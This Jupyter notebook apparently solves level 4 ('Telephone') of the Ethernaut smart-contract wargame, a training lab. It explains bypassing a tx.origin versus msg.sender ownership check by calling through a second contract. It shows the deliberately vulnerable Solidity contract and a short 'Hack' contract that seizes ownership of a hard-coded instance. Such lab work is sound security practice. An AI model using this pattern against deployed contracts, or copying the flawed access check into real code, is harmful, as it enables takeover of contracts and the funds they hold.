{
 "cells": [
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "---\n",
    "title: (04) Telephone\n",
    "description: https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe\n",
    "show-code: True\n",
    "---"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg)\n",
    "# (04) Telephone\n",
    "## https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### We use the difference between tx.origin and msg.sender to gain ownership. I called the changeOwner function through another deployed contract, which meant that msg.sender was the contract's address while tx.origin was my accounts address."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "latex"
    }
   },
   "outputs": [],
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity ^0.8.0;\n",
    "\n",
    "contract Telephone {\n",
    "\n",
    "  address public owner;\n",
    "\n",
    "  constructor() {\n",
    "    owner = msg.sender;\n",
    "  }\n",
    "\n",
    "  function changeOwner(address _owner) public {\n",
    "    if (tx.origin != msg.sender) {\n",
    "      owner = _owner;\n",
    "    }\n",
    "  }\n",
    "}\n",
    "\n",
    "contract Hack {\n",
    "  function hack() public {\n",
    "    address addr = 0xA4796a2d1c98A77DE529CbdBfd2E0A4954BD6B94;\n",
    "    Telephone t = Telephone(addr);\n",
    "    t.changeOwner(0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55);\n",
    "  }\n",
    "} "
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.6 (main, Aug 11 2022, 13:36:31) [Clang 13.1.6 (clang-1316.0.21.2.5)]"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
